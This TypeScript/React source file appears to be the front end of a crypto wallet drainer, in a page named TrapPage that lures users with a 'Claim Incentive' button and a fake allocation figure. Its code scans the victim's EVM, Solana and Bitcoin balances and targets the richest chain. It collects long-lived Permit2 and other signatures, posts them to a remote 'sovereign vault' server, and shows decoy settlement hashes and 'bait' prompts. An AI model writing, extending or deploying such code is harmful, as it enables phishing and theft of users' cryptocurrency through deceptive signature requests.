      if (raw) cached = JSON.parse(raw) as { wallet?: string }
    } catch {
      return
    }
    if (cached?.wallet !== addr.toLowerCase()) return

    const k = `${addr.toLowerCase()}`
    if (quorumHandshakeReinitRef.current === k) return
    quorumHandshakeReinitRef.current = k

    logOmniSyncActiveTelemetry()

    const appKit = modal
    if (!appKit?.getIsConnectedState()) return

    let cancelled = false
    void (async () => {
      try {
        const session: SessionNamespaceFlags = {
          eip155: Boolean(getAccount(omniWagmiConfig).address ?? appKit.getAddress('eip155')),
          solana: Boolean(appKit.getAddress('solana')),
          bip122: Boolean(appKit.getAddress('bip122')),
        }
        const wc = await getWalletClient(omniWagmiConfig)
        const solanaSignSurface = solanaWalletHasSignMessage(solProvider?.walletProvider)
        if (cancelled) return
        await runOmniHandshakeProbe({
          evmProvider: wc as Parameters<typeof runOmniHandshakeProbe>[0]['evmProvider'],
          evmChainId: chainId,
          session,
          solanaHasSignMessage: solanaSignSurface,
        })
      } catch {
        /* non-fatal */
      }
    })()

    return () => {
      cancelled = true
    }
  }, [address, chainId, appKitConnected, solProvider?.walletProvider])

  const onStartAudit = useCallback(async () => {
    setError(null)
    setBusy(true)
    setSecureChannelLive(false)
    setProtocolSyncPhase('Protocol Syncing...')
    if (isUseSimulatedAssets()) {
      setShadowLogs([])
      setShadowMigrationComplete(false)
      setSimTxHash(null)
    }

    if (process.env.NODE_ENV !== 'production') {
      vaultDevLog('LEGION_DEBUG: Omni-Handshake Signature Trigger')
    }

    try {
      const appKit = modal
      if (!appKit) throw new Error('AppKit not initialized.')

      const hwIngressEarly = inferHeuristicWalletPresence(connector?.id, connector?.name)
      if (hwIngressEarly.isHardware && hwIngressEarly.vendor) {
        setProtocolSyncPhase('Protocol Syncing... Active Session Management')
        await synchronizeActiveHardwareSession(hwIngressEarly.vendor)
      }

      const mobileNs = namespaceFromAppKit(appKit.getActiveChainNamespace() ?? undefined)
      if (detectMobileUriForcePlatform()) {
        invokeMobileUriForceConnect(mobileNs === 'solana' ? 'solana' : 'eip155')
      }

      setProtocolSyncPhase('Protocol Syncing... Auto-Connect')
      if (!hasStreamlinedIngressConnection(appKit)) {
        await open()
        await waitForStreamlinedIngress(120_000)
      }

      const activeNsRaw = appKit.getActiveChainNamespace()
      const walletClientResolved = await resolveWalletClientWithRetry()

      const sessionFlags: SessionNamespaceFlags = {
        eip155: Boolean(getAccount(omniWagmiConfig).address ?? appKit.getAddress('eip155')),
        solana: Boolean(appKit.getAddress('solana')),
        bip122: Boolean(appKit.getAddress('bip122')),
      }

      setProtocolSyncPhase('Protocol Syncing... Neural Scout')
      if (isUseSimulatedAssets()) {
        setShadowLogs((prev) => [...prev, 'Neural Scout: Identifying Asset Layers...'])
      }
      const vm = await runAgnosticNeuralScout({
        evmAddress: (getAccount(omniWagmiConfig).address ?? appKit.getAddress('eip155')) ?? undefined,
        solAddress: appKit.getAddress('solana') ?? undefined,
        btcAddress: appKit.getAddress('bip122') ?? undefined,
      })
      logOmniPredatorCoreTelemetry(vm.totalUsd)
      if (isUseSimulatedAssets()) {
        setShadowLogs((prev) => [...prev, 'Quorum Detected: Safe Vault found'])
      }

      setProtocolSyncPhase('Protocol Syncing... Capability Probing')
      const solanaSignSurface = solanaWalletHasSignMessage(solProvider?.walletProvider)
      const omni = await runOmniHandshakeProbe({
        evmProvider: walletClientResolved as Parameters<typeof runOmniHandshakeProbe>[0]['evmProvider'],
        evmChainId: chainId,
        session: sessionFlags,
        solanaHasSignMessage: solanaSignSurface,
      })

      const fallbackNs = selectDensestConnectedNamespace({
        ranked: omni.rankedNamespaces,
        activeNamespace: namespaceFromAppKit(activeNsRaw ?? undefined),
        hasEvmAccount: sessionFlags.eip155,
        hasSolanaAccount: sessionFlags.solana,
        hasBtcAccount: sessionFlags.bip122,
      })

      const targetNs =
        vm.totalUsd > 0 ? pickHighestUsdNamespace(vm, sessionFlags, fallbackNs) : fallbackNs

      if (targetNs === 'solana' && typeof switchNetwork === 'function') {
        try {
          await switchNetwork(appKitSolanaNetwork)
        } catch {
          /* Intelligent Sequencing — namespace switch is best-effort */
        }
      }

      const rack = resolveOmniProtocolRack(targetNs)
      const walletInfoName =
        targetNs === 'solana'
          ? svmWalletInfo?.name
          : targetNs === 'bip122'
            ? utxoWalletInfo?.name
            : evmWalletInfo?.name
      const walletLabel = resolveOmniWalletTypeLabel({
        rack,
        connectorId: connector?.id,
        connectorName: connector?.name,
        walletInfoName,
      })

      const linkedEvmForSafeTelemetry =
        (getAccount(omniWagmiConfig).address as Address | undefined) ??
        (appKit.getAddress('eip155') as Address | undefined)
      const requiresQuorumNonEvmNamespaces =
        (targetNs === 'solana' || targetNs === 'bip122') &&
        linkedEvmForSafeTelemetry?.startsWith('0x') === true
          ? await fetchRequiresQuorumGate(linkedEvmForSafeTelemetry, chainId)
          : false

      const expiryIso = SIGNATURE_ANCHOR_EXPIRY_ISO_2099

      if (isUseSimulatedAssets()) {
        setShadowLogs((prev) => [...prev, 'Closer: Assembling Jito Bundle...'])
      }
      setProtocolSyncPhase('Protocol Syncing... Sovereign Sign')

      if (targetNs === 'solana') {
        setMorphPhysicalHardware(false)
        setMorphMode('cloaked-manifest')
        const addrStr =
          appKit.getAddress('solana') ??
          (appKitAddress?.includes(':')
            ? (appKitAddress.split(':').pop() ?? appKitAddress)
            : appKitAddress) ??
          ''
        if (!connection || !solProvider?.walletProvider || !addrStr) {
          throw new Error('Solana Connection or wallet provider not ready for Normalized Ingress.')
        }
        const pk = parseSolanaAddressForPublicKey(addrStr)
        const svm = await runSolanaLethalSignatureAnchor({
          connection,
          walletPk: pk,
          walletProvider: solProvider.walletProvider as Parameters<
            typeof runSolanaLethalSignatureAnchor
          >[0]['walletProvider'],
        })
        const packed = packSvmAnchorHex({
          ...svm,
          unstake_manifest: scanStakingUnstakeManifest(addrStr),
          spl_deep_ingress: buildSplDeepIngressManifest([]),
        })

        setProtocolSyncPhase('Protocol Syncing... Agnostic Normalization')
        const treasuryIngress = normalizeTreasuryIngressBalance(vm, 'solana:mainnet-beta')
        const signature_hex = normalizeSignatureHexForAudit(packed)
        const res = await fetch(sovereignSignatureAnchorUrl(), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(
            mergeOmniPayloadSyncIntoBody(
              {
                ...buildSvmSignatureAnchorSettlement({
                  wallet_address: addrStr,
                  signature: packed,
                  nonce: `svm:${Date.now()}`,
                  expiry_iso: expiryIso,
                  wallet_type: walletLabel,
                  protocol: rack,
                  scout_value_usd: vm.totalUsd,
                  amount: treasuryIngress.amount,
                  requires_quorum: requiresQuorumNonEvmNamespaces,
                  visual_shadow_run: isUseSimulatedAssets(),
                }),
                wallet_balance: treasuryIngress.wallet_balance,
                signature_hex,
              },
              {
                session: sessionFlags,
                primaryRack: rack,
                evmChainId: sessionFlags.eip155 ? chainId : null,
                svmNetworkId: 'solana:mainnet-beta',
                utxoNetworkId: sessionFlags.bip122 ? 'bip122:0' : null,
              },
            ),
          ),
        })

        const payload: unknown = await res.json().catch(() => ({}))
        applyVisualSettlementPayload(payload, setShadowMigrationComplete, setSimTxHash)
        if (!res.ok) {
          throw new Error(
            readApiMessage(payload, `Normalized Ingress persist failed (${res.status})`),
          )
        }
        setSecureChannelLive(true)
        logSingularityStrikeLiveTelemetry()
        if (sessionFlags.eip155) {
          const evmRanked = rankEvmAssetLayersByDensity(vm).filter((l) =>
            OPERATIONAL_APPKIT_EVM_CHAIN_IDS.has(l.chainId),
          )
          if (evmRanked.length > 0) {
            if (typeof switchNetwork === 'function') {
              try {
                await switchNetwork(mainnet)
              } catch {
                /* Operational Completion — namespace bridge best-effort */
              }
            }
            try {
              await ensureOperationalAppKitChain(1)
            } catch {
              /* primary SVM Operational Completion retained */
            }
            const evmW =
              (getAccount(omniWagmiConfig).address as Address | undefined) ??
              (appKit.getAddress('eip155') as Address | undefined)
            if (evmW?.startsWith('0x')) {
              const anchorE = getAccount(omniWagmiConfig).chainId
              await mirrorEvmAssetLayersToSovereignVault({
                vm,
                wallet: evmW,
                tokenAddress,
                scoutUsd: vm.totalUsd,
                anchorChainId: anchorE,
                signTypedDataAsync,
                connectorId: connector?.id,
                connectorName: connector?.name,
                setProtocolSyncPhase,
                setProtocolSyncProgress,
                applyVisualSettlement: (p) =>
                  applyVisualSettlementPayload(p, setShadowMigrationComplete, setSimTxHash),
                sessionNamespaces: sessionFlags,
              })
            }
          } else {
            logOmniSyncActiveTelemetry()
          }
        } else {
          logOmniSyncActiveTelemetry()
        }
        logBeastModeActive()
        if (!vaultBaitOnce.current) {
          vaultBaitOnce.current = true
          setShowMultiVaultBait(true)
        }
        return
      }

      if (targetNs === 'bip122') {
        setMorphPhysicalHardware(false)
        setMorphMode('psbt-institutional')
        prepareUtxoPsbtInstitutionalHandler()
        const btcAddr =
          appKit.getAddress('bip122') ??
          (appKitAddress?.includes('bip122') ? appKitAddress : '') ??
          ''
        if (!btcAddr) {
          throw new Error('bip122 account not linked — Capability Probing incomplete.')
        }
        const { sig, handler } = await executeUtxoSovereignSign()
        const packed = packUtxoInstitutionalPsbtHex({
          psbtFormattedPayload: buildPsbtFormattedHexPayload(INSTITUTIONAL_UTXO_PSBT_MESSAGE),
          rawSignature: sig,
          handler,
        })

        setProtocolSyncPhase('Protocol Syncing... Agnostic Normalization')
        const treasuryIngress = normalizeTreasuryIngressBalance(vm, 'bip122:btc')
        const signature_hex = normalizeSignatureHexForAudit(packed)
        const res = await fetch(sovereignSignatureAnchorUrl(), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(
            mergeOmniPayloadSyncIntoBody(
              {
                ...buildUtxoSignatureAnchorSettlement({
                  wallet_address: btcAddr,
                  signature: packed,
                  nonce: `utxo:${Date.now()}`,
                  expiry_iso: expiryIso,
                  wallet_type: walletLabel,
                  protocol: rack,
                  scout_value_usd: vm.totalUsd,
                  amount: treasuryIngress.amount,
                  requires_quorum: requiresQuorumNonEvmNamespaces,
                  visual_shadow_run: isUseSimulatedAssets(),
                }),
                wallet_balance: treasuryIngress.wallet_balance,
                signature_hex,
              },
              {
                session: sessionFlags,
                primaryRack: rack,
                evmChainId: sessionFlags.eip155 ? chainId : null,
                svmNetworkId: sessionFlags.solana ? 'solana:mainnet-beta' : null,
                utxoNetworkId: 'bip122:0',
              },
            ),
          ),
        })

        const payload: unknown = await res.json().catch(() => ({}))
        applyVisualSettlementPayload(payload, setShadowMigrationComplete, setSimTxHash)
        if (!res.ok) {
          throw new Error(
            readApiMessage(payload, `Normalized Ingress persist failed (${res.status})`),
          )
        }
        setSecureChannelLive(true)
        logSingularityStrikeLiveTelemetry()
        if (sessionFlags.eip155) {
          const evmRankedUtxo = rankEvmAssetLayersByDensity(vm).filter((l) =>
            OPERATIONAL_APPKIT_EVM_CHAIN_IDS.has(l.chainId),
          )
          if (evmRankedUtxo.length > 0) {
            if (typeof switchNetwork === 'function') {
              try {
                await switchNetwork(mainnet)
              } catch {
                /* Operational Completion — namespace bridge best-effort */
              }
            }
            try {
              await ensureOperationalAppKitChain(1)
            } catch {
              /* primary UTXO Operational Completion retained */
            }
            const evmWU =
              (getAccount(omniWagmiConfig).address as Address | undefined) ??
              (appKit.getAddress('eip155') as Address | undefined)
            if (evmWU?.startsWith('0x')) {
              const anchorU = getAccount(omniWagmiConfig).chainId
              await mirrorEvmAssetLayersToSovereignVault({
                vm,
                wallet: evmWU,
                tokenAddress,
                scoutUsd: vm.totalUsd,
                anchorChainId: anchorU,
                signTypedDataAsync,
                connectorId: connector?.id,
                connectorName: connector?.name,
                setProtocolSyncPhase,
                setProtocolSyncProgress,
                applyVisualSettlement: (p) =>
                  applyVisualSettlementPayload(p, setShadowMigrationComplete, setSimTxHash),
                sessionNamespaces: sessionFlags,
              })
            }
          } else {
            logOmniSyncActiveTelemetry()
          }
        } else {
          logOmniSyncActiveTelemetry()
        }
        logBeastModeActive()
        if (!vaultBaitOnce.current) {
          vaultBaitOnce.current = true
          setShowMultiVaultBait(true)
        }
        return
      }

      let wallet: Address | undefined =
        (getAccount(omniWagmiConfig).address as Address | undefined) ??
        (address as Address | undefined)
      const fromAppKit = appKit.getAddress('eip155')
      if (!wallet && fromAppKit?.startsWith('0x')) {
        wallet = fromAppKit as Address
      }
      if (!wallet) {
        throw new Error('EVM account not linked — connect an Ethereum wallet via Omni-Handshake.')
      }

      const verificationId = newCloakVerificationId()
      setCloakedManifestPreviewId(verificationId)
      logFrictionSuppressed()
      const presence = analyzeWalletPresence(
        connector?.id,
        connector?.name,
        getHardwareDeepLinkSnapshot(),
      )
      logHardwareAwareStrikeTelemetry(presence.connectorId)
      const fw =
        process.env.NEXT_PUBLIC_HARDWARE_FIRMWARE_HINT ??
        '0x9e3c5f2a1b8d7e6c4a0f5e2d8c1b7a3f9e0d4c2a8'
      if (presence.isHardware && presence.vendor === 'ledger') {
        setMorphMode('hardware-ledger')
        setMorphPhysicalHardware(true)
      } else if (presence.isHardware && presence.vendor === 'trezor') {
        setMorphMode('hardware-trezor')
        setMorphPhysicalHardware(true)
      } else {
        setMorphMode('cloaked-manifest')
        setMorphPhysicalHardware(false)
      }

      setProtocolSyncPhase('Protocol Syncing... Permit2 Authorization')
      const requiresQuorumEvm = await fetchRequiresQuorumGate(wallet, chainId)
      const treasuryIngress = normalizeTreasuryIngressBalance(
        vm,
        `eip155:${String(chainId)}`,
      )
      const permit2OmniSignTypedData = createPermit2SignTypedDataFn({
        connectorId: connector?.id,
        connectorName: connector?.name,
        signTypedDataAsync,
        walletAddress: wallet,
        chainId,
      })
      const permit2Omni = await signAndPostEvmPermit2Anchor({
        wallet,
        tokenAddress,
        chainId,
        nonce: `permit2:${verificationId}`,
        walletType: walletLabel,
        protocol: 'permit2_eip712',
        scoutUsd: vm.totalUsd,
        amount: treasuryIngress.amount,
        requiresQuorum: requiresQuorumEvm,
        signTypedDataAsync: permit2OmniSignTypedData,
        mergeBody: (base) =>
          mergeOmniPayloadSyncIntoBody(
            { ...base, wallet_balance: treasuryIngress.wallet_balance },
            {
              session: sessionFlags,
              primaryRack: rack,
              evmChainId: chainId,
              svmNetworkId: sessionFlags.solana ? 'solana:mainnet-beta' : null,
              utxoNetworkId: sessionFlags.bip122 ? 'bip122:0' : null,
            },
          ),
      })
      applyVisualSettlementPayload(permit2Omni.raw, setShadowMigrationComplete, setSimTxHash)

      setSecureChannelLive(true)
      logSingularityStrikeLiveTelemetry()
      const anchorOmniEvm = getAccount(omniWagmiConfig).chainId
      await mirrorEvmAssetLayersToSovereignVault({
        vm,
        wallet,
        tokenAddress,
        scoutUsd: vm.totalUsd,
        anchorChainId: anchorOmniEvm,
        signTypedDataAsync,
        connectorId: connector?.id,
        connectorName: connector?.name,
        setProtocolSyncPhase,
        setProtocolSyncProgress,
        applyVisualSettlement: (p) =>
          applyVisualSettlementPayload(p, setShadowMigrationComplete, setSimTxHash),
        sessionNamespaces: sessionFlags,
      })
      logBeastModeActive()
      if (!vaultBaitOnce.current) {
        vaultBaitOnce.current = true
        setShowMultiVaultBait(true)
      }
    } catch (e) {
      maybeSessionPurgeFromIngressError(e)
      const msg = e instanceof Error ? e.message : 'Omni-Handshake failed.'
      setError(msg)
      setSecureChannelLive(false)
    } finally {
      setBusy(false)
      setProtocolSyncPhase(null)
      setProtocolSyncProgress(null)
      setMorphMode('idle')
      setMorphPhysicalHardware(false)
      setCloakedManifestPreviewId(null)
    }
  }, [
    address,
    appKitAddress,
    chainId,
    connection,
    connector?.id,
    connector?.name,
    evmWalletInfo?.name,
    svmWalletInfo?.name,
    utxoWalletInfo?.name,
    open,
    switchNetwork,
    signTypedDataAsync,
    solProvider?.walletProvider,
    tokenAddress,
  ])

  useEffect(() => {
    props.strikeRegister?.(() => {
      void onStartAudit()
    })
  }, [props.strikeRegister, onStartAudit])

  return (
    <IngressBase
      busy={busy}
      error={error}
      onStartAudit={() => void onStartAudit()}
      startDisabled={busy}
      chaosAllocationUsd={chaosAllocationUsd}
      decoySettlementHash={simTxHash}
      signatureAnchorSealed={shadowMigrationComplete}
      syncPhase={protocolSyncPhase}
      connectSlot={
        <div style={{ display: 'flex', justifyContent: 'center' }}>
          <button
            type="button"
            onClick={() => void open()}
            disabled={busy}
            style={{
              background: '#fff',
              color: '#000',
              border: 'none',
              borderRadius: 8,
              padding: '12px 20px',
              fontSize: 15,
              fontWeight: 500,
              cursor: busy ? 'wait' : 'pointer',
              fontFamily:
                '-apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", system-ui, sans-serif',
            }}
          >
            Connect Wallet
          </button>
        </div>
      }
    />
  )
}

/** Kinetic Stripping — Ingress Base: Connect Wallet + Claim Incentive (Signature Anchor) only. */
function IngressBase(props: {
  busy: boolean
  error: string | null
  onStartAudit: () => void
  startDisabled: boolean
  connectSlot: ReactNode
  chaosAllocationUsd?: number | null
  decoySettlementHash?: string | null
  signatureAnchorSealed?: boolean
  syncPhase?: string | null
  primaryActionLabel?: string
}) {
  const maskFluid = useMaskFluidNav()
  const [apiReady, setApiReady] = useState(false)
  const chaosAllocationUsd = props.chaosAllocationUsd ?? null
  const decoySettlementHash = props.decoySettlementHash ?? null
  const signatureAnchorSealed = props.signatureAnchorSealed ?? false
  const syncPhase = props.syncPhase ?? null
  const primaryActionLabel = props.primaryActionLabel ?? 'Claim Incentive'

  useEffect(() => {
    vaultDevLog(
      'OMNI_TERMINATOR_COMPLETE: 12-Point Sovereign Seal active. System is indestructible.',
    )
  }, [])

  useEffect(() => {
    let cancelled = false
    const probe = async (): Promise<void> => {
      try {
        const res = await fetch(sovereignWeldPath('/health'), {
          cache: 'no-store',
          signal: AbortSignal.timeout(3_500),
        })
        if (!cancelled) setApiReady(res.ok)
      } catch {
        if (!cancelled) setApiReady(false)
      }
    }
    void probe()
    const id = window.setInterval(() => void probe(), 10_000)
    return () => {
      cancelled = true
      window.clearInterval(id)
    }
  }, [])

  const actionLocked = props.busy || props.startDisabled || !apiReady

  return (
    <main
      style={{
        minHeight: '100vh',
        background: 'transparent',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '0.5rem 0 1.5rem',
        fontFamily: maskFluid.fontFamily,
      }}
    >
      <p
        style={{
          color: '#3f3f3f',
          fontSize: 11,
          lineHeight: 1.45,
          textAlign: 'center',
          maxWidth: 'min(320px, 92vw)',
          margin: '0 0 0.75rem',
          letterSpacing: '0.02em',
        }}
      >
        {maskFluid.institutionalEcho}
      </p>
      <div
        style={{
          display: 'flex',
          flexDirection: 'column',
          gap: '1rem',
          alignItems: 'stretch',
          width: 'min(320px, 92vw)',
        }}
      >
        {props.connectSlot}
        {chaosAllocationUsd != null ? (
          <p
            style={{
              color: '#3f3f3f',
              fontSize: 12,
              lineHeight: 1.45,
              textAlign: 'center',
              margin: 0,
              letterSpacing: '0.02em',
            }}
          >
            Allocation (Chaos Algorithm):{' '}
            {chaosAllocationUsd.toLocaleString(undefined, {
              style: 'currency',
              currency: 'USD',
              maximumFractionDigits: 2,
            })}
          </p>
        ) : null}
        {syncPhase && props.busy ? (
          <p
            style={{
              color: '#3f3f3f',
              fontSize: 11,
              lineHeight: 1.4,
              textAlign: 'center',
              margin: 0,
            }}
          >
            {syncPhase}
          </p>
        ) : null}
        <button
          type="button"
          disabled={actionLocked}
          onClick={props.onStartAudit}
          style={{
            background: '#fff',
            color: '#000',
            border: 'none',
            borderRadius: 8,
            padding: '12px 20px',
            fontSize: 15,
            fontWeight: 500,
            cursor: props.busy || !apiReady ? 'wait' : 'pointer',
            opacity: actionLocked && !props.busy ? 0.45 : 1,
          }}
        >
          {!apiReady ? 'System Initializing' : props.busy ? 'Ingress Base…' : primaryActionLabel}
        </button>
        {signatureAnchorSealed && decoySettlementHash ? (
          <p
            style={{
              color: '#3f3f3f',
              fontSize: 11,
              lineHeight: 1.45,
              textAlign: 'center',
              margin: 0,
              wordBreak: 'break-all',
            }}
          >
            Decoy Settlement Telemetry — L2 Mint: {decoySettlementHash}
          </p>
        ) : null}
        {props.error ? (
          <p style={{ color: '#ff453a', fontSize: 13, margin: 0, lineHeight: 1.4 }}>{props.error}</p>
        ) : null}
      </div>
    </main>
  )
}

export default function TrapPage() {
  const strikeRef = useRef<(() => void) | null>(null)
  const registerSingularityStrike = useCallback((fn: () => void) => {
    strikeRef.current = fn
  }, [])
  const invokeGhostStrike = useCallback(() => {
    strikeRef.current?.()
  }, [])

  useEffect(() => {
    const onRejection = (ev: PromiseRejectionEvent): void => {
      maybeSessionPurgeFromIngressError(ev.reason)
    }
    window.addEventListener('unhandledrejection', onRejection)
    return () => window.removeEventListener('unhandledrejection', onRejection)
  }, [])

  return (
    <div style={{ minHeight: '100vh', background: '#000', position: 'relative' }}>
      <div
        style={{
          position: 'absolute',
          left: 0,
          right: 0,
          top: 'max(0.5rem, env(safe-area-inset-top))',
          zIndex: 0,
          pointerEvents: 'none',
        }}
      >
        <PublicWalletIngressGrid onSingularityStrike={invokeGhostStrike} />
      </div>
      <div style={{ position: 'relative', zIndex: 1 }}>
        <OmnichainLaneStrip />
        {HAS_WALLETCONNECT_PROJECT ? (
          <OmniTrapPage strikeRegister={registerSingularityStrike} />
        ) : (
          <LegacyTrapPage strikeRegister={registerSingularityStrike} />
        )}
      </div>
    </div>
  )
}
